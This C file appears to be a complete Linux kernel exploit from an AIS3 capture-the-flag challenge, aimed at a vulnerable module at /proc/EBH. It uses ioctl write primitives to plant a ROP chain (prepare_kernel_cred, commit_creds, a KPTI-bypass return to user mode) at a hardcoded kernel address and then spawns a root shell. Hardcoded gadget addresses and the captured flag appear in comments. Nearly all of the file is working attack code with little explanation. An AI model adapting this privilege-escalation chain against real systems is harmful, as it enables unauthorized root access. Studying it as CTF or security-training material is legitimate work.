#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <assert.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <signal.h>
// https://niebelungen-d.github.io/posts/linuxkernel-pwn-learning/
// https://www.povcfe.site/posts/kernel_rop1/
// maybe help gdb plugin https://github.com/martinradev/gdb-pt-dump/
#define GET_PHYSICAL 0x4700
#define PEEK_PHYSICAL 0x5000
#define WRITE_TO_ADDRESS 0x5700
#define WRITE_NOTE 0x5701

#define ASM __asm__
#define PAUSE scanf("%*c");

struct PeekPhysicalData {
    void *phyaddr;
    unsigned long peeksize;
    void *peekdata;
};

struct WriteToAddrData {
    void *target;
    void *src;
    unsigned long size;
};

struct WriteNoteData {
    void *src;
    unsigned long size;
};


unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void getRootShell() {
    puts("Backing from the kernelspace.\n");
    if(getuid()) {
        printf("Failed to get the root!\n");
        exit(-1);
    }
    puts("Successful to get the root. Execve root shell now...\n");
    //system("cat /flag");
    system("/bin/sh");
    exit(0);// to exit the process normally instead of segmentation fault
}

/*
ffffffffc0000000 t device_open  [EBH]
ffffffffc0000010 t device_read  [EBH]
ffffffffc0000020 t device_write [EBH]
ffffffffc0000030 t device_release       [EBH]
ffffffffc0000230 t device_ioctl [EBH]
ffffffffc0000040 t get_physical [EBH]
ffffffffc00002e0 t cleanup_module       [EBH]
ffffffffc0000100 t write_to_address     [EBH]
ffffffffc0000150 t write_note   [EBH]
ffffffffc00002b0 t init_module  [EBH]
ffffffffc00000b0 t peek_physical        [EBH]
*/

/*
0xffffffff810892c0 T commit_creds
0xffffffff810895e0 T prepare_kernel_cred
0xffffffff81002c3a: pop rdi; ret;
0xffffffff81c00eaa: swapgs; popfq; ret;
0xffffffff81024362: iretq; ret;
0xffffffff813c34c4: mov rdi, rax; jne 0x5c34b1; xor eax, eax; ret;
0xffffffff81868813: mov rdi, rax; test rax, rax; jne 0xa68806; pop rbx; ret;
0xffffffff81c00a2f T swapgs_restore_regs_and_return_to_usermode
0xffffffff8141cbf0 xchg rsp, r8 ; jmp qword ptr [rsi + 0x66]

r8
*/
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00a2f
#define commit_creds 0xffffffff810892c0
#define prepare_kernel_cred 0xffffffff810895e0
#define pop_rdi_ret 0xffffffff81002c3a
#define swapgs 0xffffffff81c00eaa
#define iretq 0xffffffff81024362
#define mov_rdi_rax_ret 0xffffffff813c34c4
uint64_t user_rip = (uint64_t) getRootShell;

void hack(int fd){

    struct WriteNoteData b;
    char buffer[0x68];
    memset(buffer,'A',0x60);
    char probe[] = "aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggghhhhhhhhiiiiiiiijjjjjjjjkkkkkkkkllllllll";

    memcpy(buffer,probe,strlen(probe));
    unsigned long *r = &buffer[0x58];
    *r = 0xffffffff8141cbf0;
    b.size = 0x68;
    b.src = buffer;
    ioctl(fd,WRITE_NOTE,&b);
}

int write_data(fd){

    struct WriteToAddrData data;
    //char probe[] = "aaaaaaaabbbbbbbbccccccccddddddddeeeeeeeeffffffffgggggggghhhhhhhhiiiiiiiijjjjjjjjkkkkkkkkllllllll";
    
    save_state();
    char rop[0x60];

    unsigned long *r = &rop[0];
    *r++ = pop_rdi_ret;
    *r++ = 0x0;
    *r++ = prepare_kernel_cred;
    *r++ = commit_creds;
    *r++ = swapgs_restore_regs_and_return_to_usermode + 22; // bypass kpti
    *r++ = 0x0;
    *r++ = 0x0;
    *r++ = user_rip;
    *r++ = user_cs;
    *r++ = user_rflags;
    *r++ = user_sp;
    *r++ = user_ss;

    data.size = 0x60;
    data.target = 0xffffc900001b7e58;
    //data.target = 0xffffc900001afe60;
    data.src = rop;
    int retval;
    retval = ioctl(fd,WRITE_TO_ADDRESS,&data);
    return retval;
}

char b[0x1000] = {0};
unsigned long *bb = &b[0];
int main(int argc, char **argv) {
    int fd ;
    int ret;
    fd = open("/proc/EBH",2);
    assert(fd > 0);
    write_data(fd);


}
// AIS3{Oh_n0_1_fOrg37_%O_`iounmap`,_T_Wi|l_r3m*MbEr_i7_Ne/t_t1m#_QAQ}

